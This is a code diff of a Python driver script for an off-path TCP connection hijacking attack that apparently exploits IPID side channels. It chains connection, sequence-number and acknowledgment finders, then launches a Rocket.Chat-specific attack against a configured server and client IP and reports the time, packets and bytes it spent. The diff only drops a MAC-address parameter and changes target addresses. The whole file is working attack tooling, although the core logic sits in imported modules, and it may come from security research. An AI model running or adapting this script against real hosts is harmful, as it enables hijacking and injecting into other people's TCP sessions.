@@ -8,18 +8,18 @@ from IPID_HCSC.ack_find import *
 
 
 if __name__ == '__main__':
-    server_mac = '52:54:00:df:b4:7e'
-    server_ip = '172.21.0.16'
+    
+    server_ip = '172.21.0.12'
     server_port = 3000
 
     client_ip = '182.92.129.182'
 
     attack_bind_if = 'eth0'
     own_ip_prefix = '10.10.0.0'
-    collision_ip = '10.10.15.86'
+    collision_ip = '10.10.8.150'
 
     connection = Connection_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
-                                   server_port=server_port, server_mac=server_mac, bind_if_name=attack_bind_if,
+                                   server_port=server_port, bind_if_name=attack_bind_if,
                                    verbose=True)
     connection.run()
     client_port = connection.result
@@ -31,7 +31,7 @@ if __name__ == '__main__':
     time.sleep(3)
     seq = Seq_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                      server_port=server_port, client_port=client_port,
-                     server_mac=server_mac, bind_ifname=attack_bind_if, verbose=True)
+                     bind_ifname=attack_bind_if, verbose=True)
     seq.run()
     seq_in_win = seq.result
 
@@ -40,7 +40,7 @@ if __name__ == '__main__':
     else:
         ack = Ack_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
                          server_port=server_port, client_port=client_port, seq_in_win=seq_in_win,
-                         server_mac=server_mac, bind_if_name=attack_bind_if)
+                         bind_if_name=attack_bind_if)
 
         ack.run_attack_rocket_chat()
         seq_num = ack.seq_num
@@ -52,3 +52,4 @@ if __name__ == '__main__':
         print('Time: ' + str(connection.cost_time + seq.cost_time + ack.cost_time) + ' (s)')
         print('Packets: ' + str(connection.send_n + seq.send_n + ack.send_n))
         print('Bytes: ' + str(connection.send_byte + seq.send_byte + ack.send_byte) + ' (bytes)')
+
